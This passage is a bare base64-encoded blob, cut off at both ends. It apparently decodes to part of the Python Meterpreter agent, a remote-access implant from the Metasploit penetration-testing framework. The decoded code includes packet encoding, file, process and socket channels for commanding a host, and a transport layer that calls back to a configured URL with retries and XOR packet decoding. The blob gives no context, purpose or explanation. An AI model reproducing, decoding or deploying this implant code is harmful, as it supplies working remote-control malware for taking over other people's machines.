VtX3RsdnMocGt0LCB0bHZfdHlwZSkpWzBdCiAgICBleGNlcHQgSW5kZXhFcnJvcjoKICAgICAgICByZXR1cm4ge30KICAgIHJldHVybiB0bHYKCkBleHBvcnQKZGVmIHRsdl9wYWNrKCphcmdzKToKICAgIGlmIGxlbihhcmdzKSA9PSAyOgogICAgICAgIHRsdiA9IHsndHlwZSc6YXJnc1swXSwgJ3ZhbHVlJzphcmdzWzFdfQogICAgZWxzZToKICAgICAgICB0bHYgPSBhcmdzWzBdCiAgICBkYXRhID0gJycKICAgIHZhbHVlID0gdGx2Wyd2YWx1ZSddCiAgICBpZiAodGx2Wyd0eXBlJ10gJiBUTFZfTUVUQV9UWVBFX1VJTlQpID09IFRMVl9NRVRBX1RZUEVfVUlOVDoKICAgICAgICBpZiBpc2luc3RhbmNlKHZhbHVlLCBmbG9hdCk6CiAgICAgICAgICAgIHZhbHVlID0gaW50KHJvdW5kKHZhbHVlKSkKICAgICAgICBkYXRhID0gc3RydWN0LnBhY2soJz5JSUknLCAxMiwgdGx2Wyd0eXBlJ10sIHZhbHVlKQogICAgZWxpZiAodGx2Wyd0eXBlJ10gJiBUTFZfTUVUQV9UWVBFX1FXT1JEKSA9PSBUTFZfTUVUQV9UWVBFX1FXT1JEOgogICAgICAgIGRhdGEgPSBzdHJ1Y3QucGFjaygnPklJUScsIDE2LCB0bHZbJ3R5cGUnXSwgdmFsdWUpCiAgICBlbGlmICh0bHZbJ3R5cGUnXSAmIFRMVl9NRVRBX1RZUEVfQk9PTCkgPT0gVExWX01FVEFfVFlQRV9CT09MOgogICAgICAgIGRhdGEgPSBzdHJ1Y3QucGFjaygnPklJJywgOSwgdGx2Wyd0eXBlJ10pICsgYnl0ZXMoY2hyKGludChib29sKHZhbHVlKSkpLCAnVVRGLTgnKQogICAgZWxzZToKICAgICAgICBpZiBzeXMudmVyc2lvbl9pbmZvWzBdIDwgMyBhbmQgdmFsdWUuX19jbGFzc19fLl9fbmFtZV9fID09ICd1bmljb2RlJzoKICAgICAgICAgICAgdmFsdWUgPSB2YWx1ZS5lbmNvZGUoJ1VURi04JykKICAgICAgICBlbGlmIG5vdCBpc19ieXRlcyh2YWx1ZSk6CiAgICAgICAgICAgIHZhbHVlID0gYnl0ZXModmFsdWUsICdVVEYtOCcpCiAgICAgICAgaWYgKHRsdlsndHlwZSddICYgVExWX01FVEFfVFlQRV9TVFJJTkcpID09IFRMVl9NRVRBX1RZUEVfU1RSSU5HOgogICAgICAgICAgICBkYXRhID0gc3RydWN0LnBhY2soJz5JSScsIDggKyBsZW4odmFsdWUpICsgMSwgdGx2Wyd0eXBlJ10pICsgdmFsdWUgKyBOVUxMX0JZVEUKICAgICAgICBlbGlmICh0bHZbJ3R5cGUnXSAmIFRMVl9NRVRBX1RZUEVfUkFXKSA9PSBUTFZfTUVUQV9UWVBFX1JBVzoKICAgICAgICAgICAgZGF0YSA9IHN0cnVjdC5wYWNrKCc+SUknLCA4ICsgbGVuKHZhbHVlKSwgdGx2Wyd0eXBlJ10pICsgdmFsdWUKICAgICAgICBlbGlmICh0bHZbJ3R5cGUnXSAmIFRMVl9NRVRBX1RZUEVfR1JPVVApID09IFRMVl9NRVRBX1RZUEVfR1JPVVA6CiAgICAgICAgICAgIGRhdGEgPSBzdHJ1Y3QucGFjaygnPklJJywgOCArIGxlbih2YWx1ZSksIHRsdlsndHlwZSddKSArIHZhbHVlCiAgICAgICAgZWxpZiAodGx2Wyd0eXBlJ10gJiBUTFZfTUVUQV9UWVBFX0NPTVBMRVgpID09IFRMVl9NRVRBX1RZUEVfQ09NUExFWDoKICAgICAgICAgICAgZGF0YSA9IHN0cnVjdC5wYWNrKCc+SUknLCA4ICsgbGVuKHZhbHVlKSwgdGx2Wyd0eXBlJ10pICsgdmFsdWUKICAgIHJldHVybiBkYXRhCgpAZXhwb3J0CmRlZiB0bHZfcGFja19yZXF1ZXN0KG1ldGhvZCwgcGFydHM9Tm9uZSk6CiAgICBwa3QgID0gc3RydWN0LnBhY2soJz5JJywgUEFDS0VUX1RZUEVfUkVRVUVTVCkKICAgIHBrdCArPSB0bHZfcGFjayhUTFZfVFlQRV9NRVRIT0QsIG1ldGhvZCkKICAgIHBrdCArPSB0bHZfcGFjayhUTFZfVFlQRV9VVUlELCBiaW5hc2NpaS5hMmJfaGV4KGJ5dGVzKFBBWUxPQURfVVVJRCwgJ1VURi04JykpKQogICAgcGt0ICs9IHRsdl9wYWNrKFRMVl9UWVBFX1JFUVVFU1RfSUQsIGdlbmVyYXRlX3JlcXVlc3RfaWQoKSkKICAgIHBhcnRzID0gcGFydHMgb3IgW10KICAgIGZvciBwYXJ0IGluIHBhcnRzOgogICAgICAgIHBrdCArPSB0bHZfcGFjayhwYXJ0Wyd0eXBlJ10sIHBhcnRbJ3ZhbHVlJ10pCiAgICByZXR1cm4gcGt0CgojQGV4cG9ydApjbGFzcyBNZXRlcnByZXRlckNoYW5uZWwob2JqZWN0KToKICAgIGRlZiBjb3JlX2Nsb3NlKHNlbGYsIHJlcXVlc3QsIHJlc3BvbnNlKToKICAgICAgICBzZWxmLmNsb3NlKCkKICAgICAgICByZXR1cm4gRVJST1JfU1VDQ0VTUywgcmVzcG9uc2UKCiAgICBkZWYgY29yZV9lb2Yoc2VsZiwgcmVxdWVzdCwgcmVzcG9uc2UpOgogICAgICAgIHJlc3BvbnNlICs9IHRsdl9wYWNrKFRMVl9UWVBFX0JPT0wsIHNlbGYuZW9mKCkpCiAgICAgICAgcmV0dXJuIEVSUk9SX1NVQ0NFU1MsIHJlc3BvbnNlCgogICAgZGVmIGNvcmVfcmVhZChzZWxmLCByZXF1ZXN0LCByZXNwb25zZSk6CiAgICAgICAgbGVuZ3RoID0gcGFja2V0X2dldF90bHYocmVxdWVzdCwgVExWX1RZUEVfTEVOR1RIKVsndmFsdWUnXQogICAgICAgIHJlc3BvbnNlICs9IHRsdl9wYWNrKFRMVl9UWVBFX0NIQU5ORUxfREFUQSwgc2VsZi5yZWFkKGxlbmd0aCkpCiAgICAgICAgcmV0dXJuIEVSUk9SX1NVQ0NFU1MsIHJlc3BvbnNlCgogICAgZGVmIGNvcmVfd3JpdGUoc2VsZiwgcmVxdWVzdCwgcmVzcG9uc2UpOgogICAgICAgIGNoYW5uZWxfZGF0YSA9IHBhY2tldF9nZXRfdGx2KHJlcXVlc3QsIFRMVl9UWVBFX0NIQU5ORUxfREFUQSlbJ3ZhbHVlJ10KICAgICAgICByZXNwb25zZSArPSB0bHZfcGFjayhUTFZfVFlQRV9MRU5HVEgsIHNlbGYud3JpdGUoY2hhbm5lbF9kYXRhKSkKICAgICAgICByZXR1cm4gRVJST1JfU1VDQ0VTUywgcmVzcG9uc2UKCiAgICBkZWYgY2xvc2Uoc2VsZik6CiAgICAgICAgcmFpc2UgTm90SW1wbGVtZW50ZWRFcnJvcigpCgogICAgZGVmIGVvZihzZWxmKToKICAgICAgICByZXR1cm4gRmFsc2UKCiAgICBkZWYgaXNfYWxpdmUoc2VsZik6CiAgICAgICAgcmV0dXJuIFRydWUKCiAgICBkZWYgbm90aWZ5KHNlbGYpOgogICAgICAgIHJldHVybiBOb25lCgogICAgZGVmIHJlYWQoc2VsZiwgbGVuZ3RoKToKICAgICAgICByYWlzZSBOb3RJbXBsZW1lbnRlZEVycm9yKCkKCiAgICBkZWYgd3JpdGUoc2VsZiwgZGF0YSk6CiAgICAgICAgcmFpc2UgTm90SW1wbGVtZW50ZWRFcnJvcigpCgojQGV4cG9ydApjbGFzcyBNZXRlcnByZXRlckZpbGUoTWV0ZXJwcmV0ZXJDaGFubmVsKToKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBmaWxlX29iaik6CiAgICAgICAgc2VsZi5maWxlX29iaiA9IGZpbGVfb2JqCiAgICAgICAgc3VwZXIoTWV0ZXJwcmV0ZXJGaWxlLCBzZWxmKS5fX2luaXRfXygpCgogICAgZGVmIGNsb3NlKHNlbGYpOgogICAgICAgIHNlbGYuZmlsZV9vYmouY2xvc2UoKQoKICAgIGRlZiBlb2Yoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZmlsZV9vYmoudGVsbCgpID49IG9zLmZzdGF0KHNlbGYuZmlsZV9vYmouZmlsZW5vKCkpLnN0X3NpemUKCiAgICBkZWYgcmVhZChzZWxmLCBsZW5ndGgpOgogICAgICAgIHJldHVybiBzZWxmLmZpbGVfb2JqLnJlYWQobGVuZ3RoKQoKICAgIGRlZiB3cml0ZShzZWxmLCBkYXRhKToKICAgICAgICBzZWxmLmZpbGVfb2JqLndyaXRlKGRhdGEpCiAgICAgICAgcmV0dXJuIGxlbihkYXRhKQpleHBvcnQoTWV0ZXJwcmV0ZXJGaWxlKQoKI0BleHBvcnQKY2xhc3MgTWV0ZXJwcmV0ZXJQcm9jZXNzKE1ldGVycHJldGVyQ2hhbm5lbCk6CiAgICBkZWYgX19pbml0X18oc2VsZiwgcHJvY19oKToKICAgICAgICBzZWxmLnByb2NfaCA9IHByb2NfaAogICAgICAgIHN1cGVyKE1ldGVycHJldGVyUHJvY2Vzcywgc2VsZikuX19pbml0X18oKQoKICAgIGRlZiBjbG9zZShzZWxmKToKICAgICAgICBzZWxmLnByb2NfaC5raWxsKCkKICAgICAgICBpZiBoYXNhdHRyKHNlbGYucHJvY19oLnN0ZGluLCAnY2xvc2UnKToKICAgICAgICAgICAgc2VsZi5wcm9jX2guc3RkaW4uY2xvc2UoKQogICAgICAgIGlmIGhhc2F0dHIoc2VsZi5wcm9jX2guc3Rkb3V0LCAnY2xvc2UnKToKICAgICAgICAgICAgc2VsZi5wcm9jX2guc3Rkb3V0LmNsb3NlKCkKICAgICAgICBpZiBoYXNhdHRyKHNlbGYucHJvY19oLnN0ZGVyciwgJ2Nsb3NlJyk6CiAgICAgICAgICAgIHNlbGYucHJvY19oLnN0ZGVyci5jbG9zZSgpCgogICAgZGVmIGlzX2FsaXZlKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLnByb2NfaC5wb2xsKCkgaXMgTm9uZQoKICAgIGRlZiByZWFkKHNlbGYsIGxlbmd0aCk6CiAgICAgICAgZGF0YSA9ICcnCiAgICAgICAgc3Rkb3V0X3JlYWRlciA9IHNlbGYucHJvY19oLnN0ZG91dF9yZWFkZXIKICAgICAgICBpZiBzdGRvdXRfcmVhZGVyLmlzX3JlYWRfcmVhZHkoKToKICAgICAgICAgICAgZGF0YSA9IHN0ZG91dF9yZWFkZXIucmVhZChsZW5ndGgpCiAgICAgICAgcmV0dXJuIGRhdGEKCiAgICBkZWYgd3JpdGUoc2VsZiwgZGF0YSk6CiAgICAgICAgc2VsZi5wcm9jX2gud3JpdGUoZGF0YSkKICAgICAgICByZXR1cm4gbGVuKGRhdGEpCmV4cG9ydChNZXRlcnByZXRlclByb2Nlc3MpCgojQGV4cG9ydApjbGFzcyBNZXRlcnByZXRlclNvY2tldChNZXRlcnByZXRlckNoYW5uZWwpOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIHNvY2spOgogICAgICAgIHNlbGYuc29jayA9IHNvY2sKICAgICAgICBzZWxmLl9pc19hbGl2ZSA9IFRydWUKICAgICAgICBzdXBlcihNZXRlcnByZXRlclNvY2tldCwgc2VsZikuX19pbml0X18oKQoKICAgIGRlZiBjb3JlX3dyaXRlKHNlbGYsIHJlcXVlc3QsIHJlc3BvbnNlKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHN0YXR1cywgcmVzcG9uc2UgPSBzdXBlcihNZXRlcnByZXRlclNvY2tldCwgc2VsZikuY29yZV93cml0ZShyZXF1ZXN0LCByZXNwb25zZSkKICAgICAgICBleGNlcHQgc29ja2V0LmVycm9yOgogICAgICAgICAgICBzZWxmLmNsb3NlKCkKICAgICAgICAgICAgc2VsZi5faXNfYWxpdmUgPSBGYWxzZQogICAgICAgICAgICBzdGF0dXMgPSBFUlJPUl9GQUlMVVJFCiAgICAgICAgcmV0dXJuIHN0YXR1cywgcmVzcG9uc2UKCiAgICBkZWYgY2xvc2Uoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuc29jay5jbG9zZSgpCgogICAgZGVmIGZpbGVubyhzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5zb2NrLmZpbGVubygpCgogICAgZGVmIGlzX2FsaXZlKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLl9pc19hbGl2ZQoKICAgIGRlZiByZWFkKHNlbGYsIGxlbmd0aCk6CiAgICAgICAgcmV0dXJuIHNlbGYuc29jay5yZWN2KGxlbmd0aCkKCiAgICBkZWYgd3JpdGUoc2VsZiwgZGF0YSk6CiAgICAgICAgcmV0dXJuIHNlbGYuc29jay5zZW5kKGRhdGEpCmV4cG9ydChNZXRlcnByZXRlclNvY2tldCkKCiNAZXhwb3J0CmNsYXNzIE1ldGVycHJldGVyU29ja2V0VENQQ2xpZW50KE1ldGVycHJldGVyU29ja2V0KToKICAgIHBhc3MKZXhwb3J0KE1ldGVycHJldGVyU29ja2V0VENQQ2xpZW50KQoKI0BleHBvcnQKY2xhc3MgTWV0ZXJwcmV0ZXJTb2NrZXRUQ1BTZXJ2ZXIoTWV0ZXJwcmV0ZXJTb2NrZXQpOgogICAgcGFzcwpleHBvcnQoTWV0ZXJwcmV0ZXJTb2NrZXRUQ1BTZXJ2ZXIpCgojQGV4cG9ydApjbGFzcyBNZXRlcnByZXRlclNvY2tldFVEUENsaWVudChNZXRlcnByZXRlclNvY2tldCk6CiAgICBkZWYgX19pbml0X18oc2VsZiwgc29jaywgcGVlcl9hZGRyZXNzPU5vbmUpOgogICAgICAgIHN1cGVyKE1ldGVycHJldGVyU29ja2V0VURQQ2xpZW50LCBzZWxmKS5fX2luaXRfXyhzb2NrKQogICAgICAgIHNlbGYucGVlcl9hZGRyZXNzID0gcGVlcl9hZGRyZXNzCgogICAgZGVmIGNvcmVfd3JpdGUoc2VsZiwgcmVxdWVzdCwgcmVzcG9uc2UpOgogICAgICAgIHBlZXJfaG9zdCA9IHBhY2tldF9nZXRfdGx2KHJlcXVlc3QsIFRMVl9UWVBFX1BFRVJfSE9TVCkuZ2V0KCd2YWx1ZScpCiAgICAgICAgcGVlcl9wb3J0ID0gcGFja2V0X2dldF90bHYocmVxdWVzdCwgVExWX1RZUEVfUEVFUl9QT1JUKS5nZXQoJ3ZhbHVlJykKICAgICAgICBpZiBwZWVyX2hvc3QgYW5kIHBlZXJfcG9ydDoKICAgICAgICAgICAgcGVlcl9hZGRyZXNzID0gKHBlZXJfaG9zdCwgcGVlcl9wb3J0KQogICAgICAgIGVsaWYgc2VsZi5wZWVyX2FkZHJlc3M6CiAgICAgICAgICAgIHBlZXJfYWRkcmVzcyA9IHNlbGYucGVlcl9hZGRyZXNzCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKCdwZWVyX2hvc3QgYW5kIHBlZXJfcG9ydCBtdXN0IGJlIHNwZWNpZmllZCB3aXRoIGFuIHVuYm91bmQvdW5jb25uZWN0ZWQgVURQIGNoYW5uZWwnKQogICAgICAgIGNoYW5uZWxfZGF0YSA9IHBhY2tldF9nZXRfdGx2KHJlcXVlc3QsIFRMVl9UWVBFX0NIQU5ORUxfREFUQSlbJ3ZhbHVlJ10KICAgICAgICB0cnk6CiAgICAgICAgICAgIGxlbmd0aCA9IHNlbGYuc29jay5zZW5kdG8oY2hhbm5lbF9kYXRhLCBwZWVyX2FkZHJlc3MpCiAgICAgICAgZXhjZXB0IHNvY2tldC5lcnJvcjoKICAgICAgICAgICAgc2VsZi5jbG9zZSgpCiAgICAgICAgICAgIHNlbGYuX2lzX2FsaXZlID0gRmFsc2UKICAgICAgICAgICAgc3RhdHVzID0gRVJST1JfRkFJTFVSRQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHJlc3BvbnNlICs9IHRsdl9wYWNrKFRMVl9UWVBFX0xFTkdUSCwgbGVuZ3RoKQogICAgICAgICAgICBzdGF0dXMgPSBFUlJPUl9TVUNDRVNTCiAgICAgICAgcmV0dXJuIHN0YXR1cywgcmVzcG9uc2UKCiAgICBkZWYgcmVhZChzZWxmLCBsZW5ndGgpOgogICAgICAgIHJldHVybiBzZWxmLnNvY2sucmVjdmZyb20obGVuZ3RoKVswXQoKICAgIGRlZiB3cml0ZShzZWxmLCBkYXRhKToKICAgICAgICBzZWxmLnNvY2suc2VuZHRvKGRhdGEsIHNlbGYucGVlcl9hZGRyZXNzKQpleHBvcnQoTWV0ZXJwcmV0ZXJTb2NrZXRVRFBDbGllbnQpCgpjbGFzcyBTVERQcm9jZXNzQnVmZmVyKHRocmVhZGluZy5UaHJlYWQpOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIHN0ZCwgaXNfYWxpdmUpOgogICAgICAgIHRocmVhZGluZy5UaHJlYWQuX19pbml0X18oc2VsZikKICAgICAgICBzZWxmLnN0ZCA9IHN0ZAogICAgICAgIHNlbGYuaXNfYWxpdmUgPSBpc19hbGl2ZQogICAgICAgIHNlbGYuZGF0YSA9IGJ5dGVzKCkKICAgICAgICBzZWxmLmRhdGFfbG9jayA9IHRocmVhZGluZy5STG9jaygpCgogICAgZGVmIHJ1bihzZWxmKToKICAgICAgICBmb3IgYnl0ZSBpbiBpdGVyKGxhbWJkYTogc2VsZi5zdGQucmVhZCgxKSwgYnl0ZXMoKSk6CiAgICAgICAgICAgIHNlbGYuZGF0YV9sb2NrLmFjcXVpcmUoKQogICAgICAgICAgICBzZWxmLmRhdGEgKz0gYnl0ZQogICAgICAgICAgICBzZWxmLmRhdGFfbG9jay5yZWxlYXNlKCkKCiAgICBkZWYgaXNfcmVhZF9yZWFkeShzZWxmKToKICAgICAgICByZXR1cm4gbGVuKHNlbGYuZGF0YSkgIT0gMAoKICAgIGRlZiBwZWVrKHNlbGYsIGwgPSBOb25lKToKICAgICAgICBkYXRhID0gYnl0ZXMoKQogICAgICAgIHNlbGYuZGF0YV9sb2NrLmFjcXVpcmUoKQogICAgICAgIGlmIGwgPT0gTm9uZToKICAgICAgICAgICAgZGF0YSA9IHNlbGYuZGF0YQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGRhdGEgPSBzZWxmLmRhdGFbMDpsXQogICAgICAgIHNlbGYuZGF0YV9sb2NrLnJlbGVhc2UoKQogICAgICAgIHJldHVybiBkYXRhCgogICAgZGVmIHJlYWQoc2VsZiwgbCA9IE5vbmUpOgogICAgICAgIHNlbGYuZGF0YV9sb2NrLmFjcXVpcmUoKQogICAgICAgIGRhdGEgPSBzZWxmLnBlZWsobCkKICAgICAgICBzZWxmLmRhdGEgPSBzZWxmLmRhdGFbbGVuKGRhdGEpOl0KICAgICAgICBzZWxmLmRhdGFfbG9jay5yZWxlYXNlKCkKICAgICAgICByZXR1cm4gZGF0YQoKI0BleHBvcnQKY2xhc3MgU1REUHJvY2VzcyhzdWJwcm9jZXNzLlBvcGVuKToKICAgIGRlZiBfX2luaXRfXyhzZWxmLCAqYXJncywgKiprd2FyZ3MpOgogICAgICAgIGRlYnVnX3ByaW50KCdbKl0gc3RhcnRpbmcgcHJvY2VzczogJyArIHJlcHIoYXJnc1swXSkpCiAgICAgICAgc3VicHJvY2Vzcy5Qb3Blbi5fX2luaXRfXyhzZWxmLCAqYXJncywgKiprd2FyZ3MpCiAgICAgICAgc2VsZi5lY2hvX3Byb3RlY3Rpb24gPSBGYWxzZQoKICAgIGRlZiBpc19hbGl2ZShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5wb2xsKCkgaXMgTm9uZQoKICAgIGRlZiBzdGFydChzZWxmKToKICAgICAgICBzZWxmLnN0ZG91dF9yZWFkZXIgPSBTVERQcm9jZXNzQnVmZmVyKHNlbGYuc3Rkb3V0LCBzZWxmLmlzX2FsaXZlKQogICAgICAgIHNlbGYuc3Rkb3V0X3JlYWRlci5zdGFydCgpCiAgICAgICAgc2VsZi5zdGRlcnJfcmVhZGVyID0gU1REUHJvY2Vzc0J1ZmZlcihzZWxmLnN0ZGVyciwgc2VsZi5pc19hbGl2ZSkKICAgICAgICBzZWxmLnN0ZGVycl9yZWFkZXIuc3RhcnQoKQoKICAgIGRlZiB3cml0ZShzZWxmLCBjaGFubmVsX2RhdGEpOgogICAgICAgIGxlbmd0aCA9IHNlbGYuc3RkaW4ud3JpdGUoY2hhbm5lbF9kYXRhKQogICAgICAgIHNlbGYuc3RkaW4uZmx1c2goKQogICAgICAgIGlmIHNlbGYuZWNob19wcm90ZWN0aW9uOgogICAgICAgICAgICBlbmRfdGltZSA9IHRpbWUudGltZSgpICsgMC41CiAgICAgICAgICAgIG91dF9kYXRhID0gYnl0ZXMoKQogICAgICAgICAgICB3aGlsZSAodGltZS50aW1lKCkgPCBlbmRfdGltZSkgYW5kIChvdXRfZGF0YSAhPSBjaGFubmVsX2RhdGEpOgogICAgICAgICAgICAgICAgaWYgc2VsZi5zdGRvdXRfcmVhZGVyLmlzX3JlYWRfcmVhZHkoKToKICAgICAgICAgICAgICAgICAgICBvdXRfZGF0YSA9IHNlbGYuc3Rkb3V0X3JlYWRlci5wZWVrKGxlbihjaGFubmVsX2RhdGEpKQogICAgICAgICAgICBpZiBvdXRfZGF0YSA9PSBjaGFubmVsX2RhdGE6CiAgICAgICAgICAgICAgICBzZWxmLnN0ZG91dF9yZWFkZXIucmVhZChsZW4oY2hhbm5lbF9kYXRhKSkKICAgICAgICByZXR1cm4gbGVuZ3RoCmV4cG9ydChTVERQcm9jZXNzKQoKY2xhc3MgVHJhbnNwb3J0KG9iamVjdCk6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5jb21tdW5pY2F0aW9uX3RpbWVvdXQgPSBTRVNTSU9OX0NPTU1VTklDQVRJT05fVElNRU9VVAogICAgICAgIHNlbGYuY29tbXVuaWNhdGlvbl9sYXN0ID0gMAogICAgICAgIHNlbGYucmV0cnlfdG90YWwgPSBTRVNTSU9OX1JFVFJZX1RPVEFMCiAgICAgICAgc2VsZi5yZXRyeV93YWl0ID0gU0VTU0lPTl9SRVRSWV9XQUlUCiAgICAgICAgc2VsZi5yZXF1ZXN0X3JldGlyZSA9IEZhbHNlCgogICAgZGVmIF9fcmVwcl9fKHNlbGYpOgogICAgICAgIHJldHVybiAiPHswfSB1cmw9J3sxfScgPiIuZm9ybWF0KHNlbGYuX19jbGFzc19fLl9fbmFtZV9fLCBzZWxmLnVybCkKCiAgICBAcHJvcGVydHkKICAgIGRlZiBjb21tdW5pY2F0aW9uX2hhc19leHBpcmVkKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmNvbW11bmljYXRpb25fbGFzdCArIHNlbGYuY29tbXVuaWNhdGlvbl90aW1lb3V0IDwgdGltZS50aW1lKCkKCiAgICBAcHJvcGVydHkKICAgIGRlZiBzaG91bGRfcmV0aXJlKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmNvbW11bmljYXRpb25faGFzX2V4cGlyZWQgb3Igc2VsZi5yZXF1ZXN0X3JldGlyZQoKICAgIEBzdGF0aWNtZXRob2QKICAgIGRlZiBmcm9tX3JlcXVlc3QocmVxdWVzdCk6CiAgICAgICAgdXJsID0gcGFja2V0X2dldF90bHYocmVxdWVzdCwgVExWX1RZUEVfVFJBTlNfVVJMKVsndmFsdWUnXQogICAgICAgIGlmIHVybC5zdGFydHN3aXRoKCd0Y3AnKToKICAgICAgICAgICAgdHJhbnNwb3J0ID0gVGNwVHJhbnNwb3J0KHVybCkKICAgICAgICBlbGlmIHVybC5zdGFydHN3aXRoKCdodHRwJyk6CiAgICAgICAgICAgIHByb3h5ID0gcGFja2V0X2dldF90bHYocmVxdWVzdCwgVExWX1RZUEVfVFJBTlNfUFJPWFlfSE9TVCkuZ2V0KCd2YWx1ZScpCiAgICAgICAgICAgIHVzZXJfYWdlbnQgPSBwYWNrZXRfZ2V0X3RsdihyZXF1ZXN0LCBUTFZfVFlQRV9UUkFOU19VQSkuZ2V0KCd2YWx1ZScsIEhUVFBfVVNFUl9BR0VOVCkKICAgICAgICAgICAgaHR0cF9oZWFkZXJzID0gcGFja2V0X2dldF90bHYocmVxdWVzdCwgVExWX1RZUEVfVFJBTlNfSEVBREVSUykuZ2V0KCd2YWx1ZScsIE5vbmUpCiAgICAgICAgICAgIHRyYW5zcG9ydCA9IEh0dHBUcmFuc3BvcnQodXJsLCBwcm94eT1wcm94eSwgdXNlcl9hZ2VudD11c2VyX2FnZW50KQogICAgICAgICAgICBpZiBodHRwX2hlYWRlcnM6CiAgICAgICAgICAgICAgICBoZWFkZXJzID0ge30KICAgICAgICAgICAgICAgIGZvciBoIGluIGh0dHBfaGVhZGVycy5zdHJpcCgpLnNwbGl0KCJcclxuIik6CiAgICAgICAgICAgICAgICAgICAgcCA9IGguc3BsaXQoJzonKQogICAgICAgICAgICAgICAgICAgIGhlYWRlcnNbcFswXS51cHBlcigpXSA9ICcnLmpvaW4ocFsxOjBdKQogICAgICAgICAgICAgICAgaHR0cF9ob3N0ID0gaGVhZGVycy5nZXQoJ0hPU1QnKQogICAgICAgICAgICAgICAgaHR0cF9jb29raWUgPSBoZWFkZXJzLmdldCgnQ09PS0lFJykKICAgICAgICAgICAgICAgIGh0dHBfcmVmZXJlciA9IGhlYWRlcnMuZ2V0KCdSRUZFUkVSJykKICAgICAgICAgICAgICAgIHRyYW5zcG9ydCA9IEh0dHBUcmFuc3BvcnQodXJsLCBwcm94eT1wcm94eSwgdXNlcl9hZ2VudD11c2VyX2FnZW50LCBodHRwX2hvc3Q9aHR0cF9ob3N0LAogICAgICAgICAgICAgICAgICAgICAgICBodHRwX2Nvb2tpZT1odHRwX2Nvb2tpZSwgaHR0cF9yZWZlcmVyPWh0dHBfcmVmZXJlcikKICAgICAgICB0cmFuc3BvcnQuY29tbXVuaWNhdGlvbl90aW1lb3V0ID0gcGFja2V0X2dldF90bHYocmVxdWVzdCwgVExWX1RZUEVfVFJBTlNfQ09NTV9USU1FT1VUKS5nZXQoJ3ZhbHVlJywgU0VTU0lPTl9DT01NVU5JQ0FUSU9OX1RJTUVPVVQpCiAgICAgICAgdHJhbnNwb3J0LnJldHJ5X3RvdGFsID0gcGFja2V0X2dldF90bHYocmVxdWVzdCwgVExWX1RZUEVfVFJBTlNfUkVUUllfVE9UQUwpLmdldCgndmFsdWUnLCBTRVNTSU9OX1JFVFJZX1RPVEFMKQogICAgICAgIHRyYW5zcG9ydC5yZXRyeV93YWl0ID0gcGFja2V0X2dldF90bHYocmVxdWVzdCwgVExWX1RZUEVfVFJBTlNfUkVUUllfV0FJVCkuZ2V0KCd2YWx1ZScsIFNFU1NJT05fUkVUUllfV0FJVCkKICAgICAgICByZXR1cm4gdHJhbnNwb3J0CgogICAgZGVmIF9hY3RpdmF0ZShzZWxmKToKICAgICAgICByZXR1cm4gVHJ1ZQoKICAgIGRlZiBhY3RpdmF0ZShzZWxmKToKICAgICAgICBlbmRfdGltZSA9IHRpbWUudGltZSgpICsgc2VsZi5yZXRyeV90b3RhbAogICAgICAgIHdoaWxlIHRpbWUudGltZSgpIDwgZW5kX3RpbWU6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGFjdGl2YXRlX3N1Y2NlZWRlZCA9IHNlbGYuX2FjdGl2YXRlKCkKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgYWN0aXZhdGVfc3VjY2VlZGVkID0gRmFsc2UKICAgICAgICAgICAgaWYgYWN0aXZhdGVfc3VjY2VlZGVkOgogICAgICAgICAgICAgICAgc2VsZi5jb21tdW5pY2F0aW9uX2xhc3QgPSB0aW1lLnRpbWUoKQogICAgICAgICAgICAgICAgcmV0dXJuIFRydWUKICAgICAgICAgICAgdGltZS5zbGVlcChzZWxmLnJldHJ5X3dhaXQpCiAgICAgICAgcmV0dXJuIEZhbHNlCgogICAgZGVmIF9kZWFjdGl2YXRlKHNlbGYpOgogICAgICAgIHJldHVybgoKICAgIGRlZiBkZWFjdGl2YXRlKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgc2VsZi5fZGVhY3RpdmF0ZSgpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzCiAgICAgICAgc2VsZi5jb21tdW5pY2F0aW9uX2xhc3QgPSAwCiAgICAgICAgcmV0dXJuIFRydWUKCiAgICBkZWYgZGVjcnlwdF9wYWNrZXQoc2VsZiwgcGt0KToKICAgICAgICBpZiBwa3QgYW5kIGxlbihwa3QpID4gUEFDS0VUX0hFQURFUl9TSVpFOgogICAgICAgICAgICAjIFdlIGRvbid0IHN1cHBvcnQgQUVTIGVuY3J5cHRpb24geWV0LCBzbyBqdXN0IGRvIHRoZSBub3JtYWwKICAgICAgICAgICAgIyBYT1IgdGhpbmcgYW5kIG1vdmUgb24KICAgICAgICAgICAgeG9yX2tleSA9IHN0cnVjdC51bnBhY2soJ0JCQkInLCBwa3RbOlBBQ0tFVF9YT1JfS0VZX1NJWkVdKQogICAgICAgICAgICByYXcgPSB4b3JfYnl0ZXMoeG9yX2tleSwgcGt0KQogICAgICAgICAgICByZXR1cm4gcmF3W1BBQ0tFVF9IRUFERVJfU0laRTpdCiAgICAgICAgcmV0dXJuIE5vbmUKCiAgICBkZWYgZ2V0X3BhY2tldChzZWxmKToKICAgICAgICBzZWxmLnJlcXVlc3RfcmV0aXJlID0gRmFsc2UKICAgICAgICB0cnk6CiAgICAgICAgICAgIHBrdCA9IHNlbGYuZGVjcnlwdF9wYWNrZXQoc2VsZi5fZ2V0X3BhY2tldCgpKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgZGVidWdfdHJhY2ViYWNrKCkKICAgICAgICAgICAgcmV0dXJuIE5vbmUKICAgICAgICBpZiBwa3QgaXM